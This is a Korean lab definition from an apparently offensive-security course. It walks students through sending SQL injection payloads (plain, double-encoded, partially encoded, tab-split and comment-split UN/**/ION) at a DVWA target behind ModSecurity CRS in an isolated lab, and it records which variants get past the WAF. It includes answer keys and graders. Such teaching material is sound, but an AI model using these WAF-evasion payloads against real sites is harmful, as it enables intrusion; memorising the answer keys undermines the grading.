lab_id: standalone-attack-week10
title: "필터 우회(인코딩·분할·난독화) vs 정규화 방어"
version: standalone-attack
course: attack
week: 10
description: |
  공격기법 W10 — WAF 필터를 빠져나가는 우회(evasion) 기법과 그에 맞서는 ModSec CRS 의 정규화
  (normalization) 방어. 핵심 원리는 "WAF 가 보는 표현"과 "백엔드가 실행하는 의미"의 분리다.
  공격자(el34-attacker, 10.20.30.202)는 평문 SQLi(`UNION SELECT`)를 baseline 으로 던져 dvwa
  (차단 모드)가 403 으로 막는 것을 확인한 뒤, 같은 공격을 인코딩(이중·유니코드)·분할(주석·공백)·
  난독화(대소문자)로 변형해 다시 던진다. ModSec CRS 는 검사 전에 transformation(urlDecodeUni/
  compressWhitespace/lowercase)으로 인코딩·탭·대소문자 변형을 원형으로 되돌려 942 룰군에 다시 잡아
  403 으로 차단한다. 그러나 이 CRS 3.3.2 의 libinjection 은 주석분할(UN/**/ION)은 못 복원해 실제로
  302 우회된다 — "정규화는 강력하나 만능이 아님". 마지막에 우회 결과 차이(인코딩·탭·대소문자=차단,
  주석분할=우회)와 고급 방향(WAF–백엔드 파서 차이·HPP)을 정리한다.
  실습은 페이로드 전송 + 로그 읽기뿐이라 심는 흔적이 없다(공유 인프라 보존). 인가된 실습 환경
  (el34)에서만. 모든 명령은 el34 호스트(ssh ccc@192.168.0.151)에서 docker exec 로. 합격 임계값 0.7.
difficulty: medium
duration_minutes: 160
prerequisites:
  - "W04–W05(SQLi/XSS·WAF) 통과 — CRS 942 룰군·anomaly score·949110 차단 메커니즘 이해"
  - "el34 호스트 SSH 접속 + docker exec 로 컨테이너 진입"
  - "lecture §1(우회 원리: 표현 ≠ 의미) §2(인코딩) §3(분할·난독화) §4(정규화 방어) 숙지"
objectives:
  - "WAF 우회의 근본 원리(WAF 가 보는 표현 ≠ 백엔드가 실행하는 의미) 이해"
  - "평문 SQLi 를 baseline(403)으로 잡고, 인코딩·분할·난독화로 변형해 우회 시도"
  - "CRS transformation(정규화)이 인코딩·탭·대소문자는 원형으로 되돌려 942 에 차단(403)하나 주석분할은 못 잡아 우회(302)됨을 확인"
  - "우회 결과 차이(인코딩·탭·대소문자=차단, 주석분할=우회)와 고급 방향(파서 차이·특이 인코딩·HPP) 구분"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 목표
      우회 실습을 시작하기 전, 대상 vhost `dvwa.el34.lab` 이 도달 가능한지 점검한다.

      ## 📖 개념 한 줄
      WAF 우회 실습의 무대는 **차단 모드 vhost** 여야 우회 성공/실패가 또렷이 보인다. el34 에서
      dvwa 는 ModSec 차단 모드(403), juice 는 탐지만(200)이므로 대상은 dvwa 다(lecture §1.3).

      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) 차단형 dvwa 도달성 — 응답코드(우회 성공/실패를 또렷이 보려면 차단 모드 대상)
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
      ```
      - `-H 'Host: dvwa.el34.lab'`(dvwa vhost 지정), `-w 'dvwa=%{http_code}'`(응답 코드만), `-o /dev/null`(본문 버림).

      ## ✅ 합격 기준
      `dvwa` 출력 시 통과. **근거:** dvwa=<코드> 형태로 응답이 출력되면 대상 도달(우회를 시험할 수
      있는 상태) — 차단형 vhost 라야 평문 403 대비 우회의 성공/실패를 측정할 수 있다.
    hint: '도달성'
    category: survey
    points: 10
    answer: |
      # 1) 차단형 dvwa 도달성 — 응답코드(우회 성공/실패를 또렷이 보려면 차단 모드 대상)
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
    answer_detail: "필터 우회 대상 = dvwa(차단 모드, ModSec CRS). 응답 코드가 출력되면 대상 도달로 판정 — 차단형 vhost 라야 평문 403 대비 우회의 성공/실패를 또렷이 측정할 수 있다."
    expected_output: |
      dvwa=302
    verify:
      type: output_contains
      expect: 'dvwa'
      field: stdout
      semantic:
        intent: "대상 점검"
        success_criteria: ["도달"]
        acceptable_methods: ["**[OSS] curl (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 목표
      변형 없는 **평문 SQLi** 를 던져 dvwa 가 403 으로 막는 것을 확인하고, 이를 우회 평가의
      기준점(baseline)으로 삼는다.

      ## 📖 개념 한 줄
      우회 성공/실패는 baseline 대비로만 판정할 수 있다. 평문 `UNION SELECT` 가 403 이어야,
      "변형이 이 403 을 200 으로 바꿀 수 있는가"라는 우회의 질문이 성립한다(lecture §1.1).

      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) baseline — 평문 UNION SELECT SQLi(변형 없음) → 차단형 dvwa 응답코드
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'plain=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
      # 2) 해석 — 평문 SQLi=403(baseline), 우회로 이걸 통과시킬 수 있나?
      echo "→ 평문 SQLi = 403(차단). 이게 baseline. 우회로 이걸 통과시킬 수 있나?"
      ```
      - `id=1%27%20UNION%20SELECT%201--`(`%27`='`', `%20`=공백) = 평문 `1' UNION SELECT 1--`. 변형 없는 전형적 UNION SQLi → CRS 942 가 곧장 잡음.

      ## ✅ 합격 기준
      `403` 출력 시 통과. **근거:** 평문 SQLi 의 응답이 403(WAF 차단=baseline)이면 통과 — 이 403 이
      이후 우회 시도의 기준선이다.
    hint: '평문 UNION → 403'
    category: manipulation
    points: 12
    answer: |
      # 1) baseline — 평문 UNION SELECT SQLi(변형 없음) → 차단형 dvwa 응답코드
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'plain=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
      # 2) 해석 — 평문 SQLi=403(baseline), 우회로 이걸 통과시킬 수 있나?
      echo "→ 평문 SQLi = 403(차단). 이게 baseline. 우회로 이걸 통과시킬 수 있나?"
    answer_detail: "baseline = 평문 SQLi → 403. 변형 없는 UNION SELECT 가 CRS 942 룰군에 곧장 잡혀 anomaly score 누적 → 949110 차단(403). 이후 우회 기법이 이 차단을 200 으로 통과시키는지가 본 주차의 관건."
    expected_output: |
      plain=403
      → 평문 SQLi = 403(차단). 이게 baseline. 우회로 이걸 통과시킬 수 있나?
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "기준 공격 baseline"
        success_criteria: ["평문 SQLi 403"]
        acceptable_methods: ["**[OSS] 평문 SQLi (권장)**"]
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 목표
      가장 기본적인 우회 계열인 **인코딩**(이중 인코딩·부분 URL 인코딩)으로 평문 SQLi 를 변형해
      던지고, 그 결과(대부분 여전히 403)를 확인한다.

      ## 📖 개념 한 줄
      인코딩 우회는 "WAF 가 디코드 **전**에 검사한다"는 가정에 기댄다. 그러나 CRS 는 정규화
      (`t:urlDecodeUni`)로 **먼저 디코드한 뒤** 검사하므로 이 가정이 깨진다(lecture §2, §4).

      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) 이중 인코딩 — %2527(%를 %25로 한번 더)→디코드 시 %27→'
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dbl=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%2527%20UNION%20SELECT'"
      # 2) 부분 URL 인코딩 — %55=U,%53=S → 디코드 시 UNION SELECT
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'mix=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20%55NION%20%53ELECT'"
      # 3) 해석 — CRS가 t:urlDecodeUni로 디코드 후 검사 → 대부분 여전히 403
      echo "→ %55=U 등 인코딩 → CRS가 t:urlDecodeUni로 디코드 후 검사 → 대부분 여전히 403"
      ```
      - `%2527`=이중 인코딩(`%`를 `%25`로 한 번 더 → `%2527`→`%27`→`'`), `%55`=`U`/`%53`=`S`(부분 URL 인코딩 → UNION SELECT).

      ## ✅ 합격 기준
      `403` 출력 시 통과. **근거:** 인코딩 변형의 응답이 대부분 여전히 403(우회 실패)이면 통과 —
      CRS 가 디코드 후 잡는다(디코드-전-검사 가정이 깨짐).
    hint: '이중인코딩 %2527, %55NION'
    category: manipulation
    points: 12
    answer: |
      # 1) 이중 인코딩 — %2527(%를 %25로 한번 더)→디코드 시 %27→'
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dbl=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%2527%20UNION%20SELECT'"
      # 2) 부분 URL 인코딩 — %55=U,%53=S → 디코드 시 UNION SELECT
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'mix=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20%55NION%20%53ELECT'"
      # 3) 해석 — CRS가 t:urlDecodeUni로 디코드 후 검사 → 대부분 여전히 403
      echo "→ %55=U 등 인코딩 → CRS가 t:urlDecodeUni로 디코드 후 검사 → 대부분 여전히 403"
    answer_detail: "인코딩 우회 = 같은 문자를 다른 표기로 적기(%55=U, %2527=이중인코딩→'). 노림수는 'WAF 가 디코드 전에 검사한다'는 가정이지만, CRS 는 t:urlDecodeUni transformation 으로 먼저 디코드한 뒤 검사하므로 원형 UNION SELECT 로 되돌아가 942 에 잡힘 → 우회 실패(대부분 403)."
    expected_output: |
      dbl=403
      mix=403
      → %55=U 등 인코딩 → CRS가 t:urlDecodeUni로 디코드 후 검사 → 대부분 여전히 403
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "인코딩 우회 시도 + 정규화"
        success_criteria: ["인코딩 시도", "정규화로 차단"]
        acceptable_methods: ["**[OSS] 인코딩 payload (권장)**"]
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 목표
      인코딩과 결이 다른 우회 — 키워드의 형태를 흐트러뜨리는 **분할·난독화**(주석 삽입·탭 공백)로
      변형해 던지고, **무엇이 막히고 무엇이 뚫리는지** 실측으로 확인한다.

      ## 📖 개념 한 줄
      분할·난독화는 문자를 다르게 적는 게 아니라 키워드 **형태**를 쪼갠다. CRS 의
      `t:compressWhitespace` 는 탭 분할을 복원해 차단(403)하지만, 이 CRS 3.3.2 의 SQLi 탐지
      (libinjection)는 주석 분할(`UN/**/ION`)을 복원하지 못해 **실제로 우회(302)** 된다(lecture §3, §4).

      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) 주석 분할 — UN/**/ION SE/**/LECT(SQL 빈 주석으로 키워드 쪼갬, DB는 UNION으로 실행)
      C=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT'")
      echo "cmt=$C"
      # 2) 탭 공백 — %09(공백 대신 탭으로 토큰 구분, DB는 탭도 구분자로 받음)
      T=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%09UNION%09SELECT'")
      echo "tab=$T"
      # 3) 판정 — 주석분할이 차단(403)도 무응답(000)도 아니면 우회 성공
      if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석분할 우회 성공(cmt=$C): libinjection이 주석분할을 못 복원"; else echo "→ 주석분할 차단/무응답(cmt=$C)"; fi
      # 4) 대조 — 탭 분할은 compressWhitespace로 복원돼 차단(403)
      echo "→ 대조: 탭 분할(tab=$T)은 t:compressWhitespace로 복원돼 차단. 변형마다 결과가 다르다"
      ```
      - 주석 삽입(`/**/`로 키워드 사이 쪼갬 — libinjection 미복원→우회), 탭(`%09` — compressWhitespace 복원→차단), 케이스(`UnIoN` — lowercase 복원→차단).

      ## ✅ 합격 기준
      `우회 성공` 출력 시 통과. **근거:** 탭 분할(tab=403)은 t:compressWhitespace 로 차단되지만 주석분할
      (cmt=302)은 libinjection 이 못 복원해 우회한다 — 두 결과의 대조로 정규화의 한계를 확인.
    hint: 'UN/**/ION 주석, %09 탭'
    category: manipulation
    points: 12
    answer: |
      # 1) 주석 분할 — UN/**/ION SE/**/LECT(SQL 빈 주석으로 키워드 쪼갬, DB는 UNION으로 실행)
      C=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT'")
      echo "cmt=$C"
      # 2) 탭 공백 — %09(공백 대신 탭으로 토큰 구분, DB는 탭도 구분자로 받음)
      T=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%09UNION%09SELECT'")
      echo "tab=$T"
      # 3) 판정 — 주석분할이 차단(403)도 무응답(000)도 아니면 우회 성공
      if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석분할 우회 성공(cmt=$C): libinjection이 주석분할을 못 복원"; else echo "→ 주석분할 차단/무응답(cmt=$C)"; fi
      # 4) 대조 — 탭 분할은 compressWhitespace로 복원돼 차단(403)
      echo "→ 대조: 탭 분할(tab=$T)은 t:compressWhitespace로 복원돼 차단. 변형마다 결과가 다르다"
    answer_detail: "분할/난독화 = 문자가 아니라 키워드 형태를 흐트러뜨리기. 탭(%09)은 t:compressWhitespace 가, 대소문자(UnIoN)는 t:lowercase 가 복원해 차단(403). 그러나 주석 분할(UN/**/ION)은 이 CRS 3.3.2 의 libinjection 이 토큰을 복원하지 못해 실제로 302 우회된다 — 판정은 주석분할이 차단(403)이 아닌 우회임을 게이트한다(탭 차단·주석 우회의 대조)."
    expected_output: |
      cmt=302
      tab=403
      → 주석분할 우회 성공(cmt=302): libinjection이 주석분할을 못 복원
      → 대조: 탭 분할(tab=403)은 t:compressWhitespace로 복원돼 차단. 변형마다 결과가 다르다
    verify:
      type: output_contains
      expect: '우회 성공'
      field: stdout
